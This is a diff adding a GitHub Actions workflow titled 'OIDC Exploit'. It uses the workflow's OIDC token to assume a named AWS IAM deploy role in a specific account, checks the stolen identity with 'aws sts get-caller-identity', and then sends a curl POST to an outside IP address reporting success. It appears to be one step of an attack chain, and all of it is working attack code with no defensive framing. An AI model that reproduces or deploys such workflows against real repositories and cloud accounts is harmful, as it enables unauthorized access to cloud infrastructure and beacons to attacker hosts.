@@ -1,0 +1,25 @@
+name: OIDC Exploit
+
+on:
+  push:
+    branches: [main]
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  assume-role:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Assume GitHubActionsDeployRole via OIDC
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::851276830991:role/GitHubActionsDeployRole
+          aws-region: us-east-1
+
+      - name: Prove access
+        run: |
+          aws sts get-caller-identity
+          curl -s -X POST "http://54.226.194.239/chain4" \
+            -d "oidc_success=yes&role=GitHubActionsDeployRole"
